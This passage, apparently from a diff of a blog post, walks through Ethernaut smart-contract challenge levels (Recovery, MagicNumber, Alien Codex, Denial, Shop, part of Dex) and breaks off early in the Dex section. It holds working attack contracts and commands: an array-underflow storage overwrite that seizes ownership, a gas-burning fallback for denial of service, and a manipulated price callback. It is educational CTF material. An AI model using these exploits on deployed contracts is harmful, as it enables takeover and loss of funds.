+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;futureAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rlp_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;challenge_addr&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;futureAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Call selfdestroy of the recovered contract:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;recovered_SimpleToken_addr&amp;gt; &quot;destroy(address)&quot; &amp;lt;any_to_addr&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;magicnumber&quot;&gt;MagicNumber&lt;/h1&gt;
+&lt;p&gt;We need to deploy contract that returns 42 in raw EVM bytecode. Recall that EVM interprets solidity source code files as bytecode, which is just sequence of hex characters. Bytecode is comprised of two different pieces: initialization (only executed at deployment, telling EVM to store remaining runtime code) and runtime code (permanently stored code on blockchain).&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.evm.codes/&quot;&gt;EVM Opcodes Reference&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return 42&lt;/code&gt; requires the value to be stored in memory not just the stack.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETURN&lt;/code&gt; is opcode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;F3&lt;/code&gt; taking two stack inputs: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(offset, size)&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Hence, the order of business is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSTORE(position, value)&lt;/code&gt; = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSTORE(0x00,0x2a)&lt;/code&gt;. Then, we want to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETURN(position=0, number of bytes=32)&lt;/code&gt; = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETURN(0x00,0x20)&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSTORE&lt;/code&gt; is opcode 52, which takes 2 stack inputs: position (0) and value (42=0x2a)&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PUSH1&lt;/code&gt; is opcode 60, stands for pushing 1 byte (2 hex characters) to the stack&lt;/li&gt;
+      &lt;li&gt;Note the order of pushing params to stack: with stack data structure, last in first out (LIFO)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;602&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// PUSH1 0x2a
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6000&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// PUSH1 0x00 (memory slot location offset)
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//MSTORE (position=0, value=42)
+&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;6020&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//PUSH1 0x20 (value is 32 bytes for the size param)
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6000&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// PUSH1 0x00 (memory slot location offset)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f3&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//RETURN (position=0, number of bytes=32)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Therefore, Runtime opcode sequence in hex : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602a60005260206000f3&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;20 hex digits = 10 bytes&lt;/li&gt;
+  &lt;li&gt;this bytecode represents a contract that returns 0x2a&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now for the full &lt;strong&gt;contract creation&lt;/strong&gt; code: we have two components:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;store in memory the 10 bytes of runtime bytecode from above&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSTORE(0, 0x602a60005260206000f3)&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PUSH10&lt;/code&gt; is opcode 69, which is needed to push the 10bytes of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602a60005260206000f3&lt;/code&gt; to the stack&lt;/li&gt;
+      &lt;li&gt;Since solidity memory slots are 32 bytes, this will pad with 22 zeroes on the left&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;return the runtime bytecode: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETURN(offset=22,size=10)&lt;/code&gt; = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETURN(0x16, 0x0a)&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Recall &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETURN&lt;/code&gt; is opcode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;F3&lt;/code&gt; taking two stack inputs: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(offset, size)&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//MSTORE runtime bytecode
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;69602&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a60005260206000f3&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// PUSH10(value=0x602a60005260206000f3) 
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6000&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// PUSH1 0x00 (position to store bytecode)
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// MSTORE(position=0, size=10 bytes)
+//RETURN
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//PUSH1 0x0a (size is 10bytes)
+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6016&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//PUSH1 0x16 (position offset=22)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f3&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return(position=22, size=10 bytes)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To summarize, the full contract creation opcode sequence in hex : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x69602a60005260206000f3600052600a6016f3&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To deploy this raw bytecode in foundry, I needed to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foundryup&lt;/code&gt; in the terminal to get the most recent nightly build, to ensure we have the new feature that allows deploying raw contract bytecode with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send --create&lt;/code&gt; (ie. when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;to&lt;/code&gt; destination of transaction is not specified). See the merged Github PR &lt;a href=&quot;https://github.com/foundry-rs/foundry/pull/2871&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send --create &amp;lt;raw_bytecode_above&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web3&lt;/code&gt; library in Javascript, the equivalent command is:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web3.eth.sendTransaction({ data: &apos;0x69602a60005260206000f3600052600a6016f3&apos; })&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;In Etherscan, under the contract tab, we should see that the bytecode is only the runtime bytecode left.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/etherscan-rawbyte.png&quot;&gt;&lt;img src=&quot;/assets/etherscan-rawbyte.png&quot; alt=&quot;etherscan-screenshot&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;To finish the level:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;challenge_addr&amp;gt; &quot;setSolver(address)&quot; &amp;lt;deployed_contract_from_rawbytecode&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;alien-codex&quot;&gt;Alien Codex&lt;/h1&gt;
+
+&lt;p&gt;This level tests knowledge of the storage layout of a smart contract (see &lt;a href=&quot;https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html&quot;&gt;docs&lt;/a&gt;).&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;2^256 - 1 slots (as many slots as there are possible hashes)&lt;/li&gt;
+  &lt;li&gt;32 bytes of data per slot&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AlienCodex&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ownable&lt;/code&gt;, the first variable to be stored is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owner&lt;/code&gt; (address are 20 bytes) from Ownable contract. Next, the bool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact&lt;/code&gt; variable can still fit in the same first slot. Both are statically sized variables.&lt;/p&gt;
+
+&lt;p&gt;For dynamic arrays, specifically &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; in this case, let the next slot position be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p,&lt;/code&gt; which will store the number of elements in the array, ie. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;array.length&lt;/code&gt;. Then, actual array data is at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(p)&lt;/code&gt; (so that it won’t be overwriting anything existing when we expand the dynamic array). So &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;array[0]&lt;/code&gt; is stored at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(p)&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;array[1]&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(p)+1&lt;/code&gt;, and so on.&lt;/p&gt;
+
+&lt;p&gt;The key vulnerability of this contract is allowing modifying the dynamic array length without checking for over/underflow, which allows us to set the array bounds to cover the entire storage area. This allows us to modify any part of the contract storage.&lt;/p&gt;
+
+&lt;p&gt;In this challenge: we have the following storage slot layout&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Slot&lt;/th&gt;
+      &lt;th&gt;Variable Stored&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owner&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;codex.length&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;keccak(1)&lt;/td&gt;
+      &lt;td&gt;codex[0]&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;keccak(1)+1&lt;/td&gt;
+      &lt;td&gt;codex[1]&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;…&lt;/td&gt;
+      &lt;td&gt;…&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2^256 - 1&lt;/td&gt;
+      &lt;td&gt;codex[2^256 - 1 - uint(keccak(1))]&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0 (overflow, can overwrite!)&lt;/td&gt;
+      &lt;td&gt;codex[2^256 - 1 - uint(keccak(1)) + 1]&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;We can thus deploy an attacker contract with the following steps:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make_contact&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retract&lt;/code&gt;  which causes underflow from 0 and leads to code.length = 2^256 - 1&lt;/li&gt;
+  &lt;li&gt;Now that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; length is maximally large, we can index into the slot that overwrites slot 0.
+    &lt;ul&gt;
+      &lt;li&gt;Slot i corresponds to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; array indexed at  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i - keccak256(1)&lt;/code&gt;, so slot 0 = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2^256 - 1 - keccak256(1) + 1&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revise&lt;/code&gt; with the correct index &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt; and your address converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes32&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IAlienCodex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;        
+    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;revise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))));&lt;/span&gt;        
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;denial&quot;&gt;Denial&lt;/h1&gt;
+&lt;p&gt;Key: Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;withdraw&lt;/code&gt; function uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; to send ETH, we can use reentrancy and implement a fallback function within our attack contract which consumes all the gas. Hence, there will be no gas left for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owner.transfer(amountToSend)&lt;/code&gt;. This is a DoS (denial of service) attack.&lt;/p&gt;
+
+&lt;p&gt;The lesson here is that using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;send&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transfer&lt;/code&gt; can introduce vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;With reentrancy, recall the check-effect-interact paradigm (in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Denial&lt;/code&gt; contract, there is no check for available balances, and the low-level &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt;, which allows reentrancy, occurs before the effect of updating balances (classic reentrancy attack setup).&lt;/p&gt;
+
+&lt;p&gt;To deny the owner’s withdrawal:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;deploy an attack contract with fallback function that consumes nearly all the gas&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; receive() external payable {        
+         while(true){}
+     }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setWithdrawPartner&lt;/code&gt; to be this attack contract&lt;/li&gt;
+  &lt;li&gt;call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Denial&lt;/code&gt; contract’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;withdraw()&lt;/code&gt; to confirm that it indeed runs out of gas&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Note that it will still work with sufficiently large amount of gas (2.3M gas and above worked for me), while challenge assumes 1M maximum gas.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;By default Foundry’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast&lt;/code&gt; gave gas limit of 3.4M to withdraw function (so owner still got the drip funds, and was not denied)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;challenge_addr&amp;gt; &quot;withdraw()&quot; --gas-limit 1000000&lt;/code&gt; does deny the drip for both parties (out of gas error for both drips)&lt;/li&gt;
+  &lt;li&gt;Perhaps external &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; is not actually allowed to forward all 100% of the gas available, although I couldn’t find official documentation on this&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;shop&quot;&gt;Shop&lt;/h1&gt;
+&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;price()&lt;/code&gt; of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buyer&lt;/code&gt; interface is not actually implemented, it will resort to the definition of our attacker contract&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;It’s unsafe to change the state (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;price&lt;/code&gt; in this case) based on external, untrusted contracts logic&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AttackShop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;        
+    &lt;span class=&quot;n&quot;&gt;IShop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timesCalled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+
+    &lt;span class=&quot;k&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;shop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IShop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;price&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isSold&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;        
+        &lt;span class=&quot;n&quot;&gt;shop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;                
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;dex&quot;&gt;Dex&lt;/h1&gt;
+
+&lt;p&gt;Firstly, a quick note on importing OpenZeppelin contracts in Solidity using foundry.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge install openzeppelin/openzeppelin-contracts&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge remappings &amp;gt; remappings.txt&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;helps VScode extension to play nicely. see &lt;a href=&quot;https://book.getfoundry.sh/config/vscode&quot;&gt;https://book.getfoundry.sh/config/vscode&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;generates this txt file&lt;/li&gt;
+    &lt;/ul&gt;
+
